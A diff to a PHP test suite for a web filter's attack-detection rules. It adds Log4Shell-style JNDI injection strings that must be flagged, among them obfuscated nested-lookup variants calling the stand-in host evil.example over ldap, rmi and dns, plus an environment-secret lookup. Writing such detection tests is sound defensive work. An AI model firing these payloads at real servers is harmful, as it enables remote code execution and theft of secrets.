@@ -109,6 +109,10 @@ return [
             // Log4Shell and template injection -- "anywhere", headers too
             ['/?a=${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
             ['/?a=${${::-j}ndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
+            ['/?a=${${lower:j}ndi:ldap://evil.example/x}', [], 'ATK-JNDI'],       // nested lookups: lower, upper, any other
+            ['/', ['HTTP_USER_AGENT' => '${${upper:j}${upper:n}di:rmi://evil.example/x}'], 'ATK-JNDI'],
+            ['/?a=${${env:NaN:-j}ndi:dns://evil.example/x}', [], 'ATK-JNDI'],
+            ['/?a=${ctx:loginId}', [], 'ATK-JNDI'],
             ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
             ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
             ['/', ['HTTP_X_FORWARDED_FOR' => '${jndi:ldap://evil.example/x}'], 'ATK-JNDI'],
@@ -169,6 +173,7 @@ return [
             '/?cmd=cat readme.txt',                  // "cat /" needs a slash
             '/?q=$100 gift card',                    // $ without {
             '/?a=${x}',                              // ${ without jndi/env/...
+            '/?msg=Total ${amount} of ${count}',     // two placeholders, none inside the other
             '/?f=report.pdf', '/?f=../images/logo.png', // one ../ is not refused
             '/?q=windows 11 review',                 // c:\windows\ needed
             '/?q=cron job setup',
@@ -290,7 +295,7 @@ return [
     },
     'RSF02-06 attacks: the file itself -- namespace, version, IDs, descriptions' => function (): void {
         $s = attacksRules();
-        same('2026.09.1', $s->origins['versions']['ATK'] ?? null, 'the set has a version');
+        same('2026.10.2', $s->origins['versions']['ATK'] ?? null, 'the set has a version');
         truthy(isset($s->origins['versions']['SCAN']), 'the scanner set is still there');
         // Every ATK rule has an ID; every content rule has an ATK origin.
         $own = 0;
